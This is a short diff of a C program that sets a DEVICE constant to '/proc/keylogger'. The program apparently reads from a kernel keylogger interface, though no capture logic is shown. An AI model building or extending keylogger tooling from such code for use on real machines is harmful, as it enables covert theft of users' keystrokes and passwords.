@@ -1,7 +1,7 @@
 #include <stdio.h>
 #include <strings.h>
 #include <time.h>
-#define DEVICE ""
+#define DEVICE "/proc/keylogger"
 
 int main()
 {
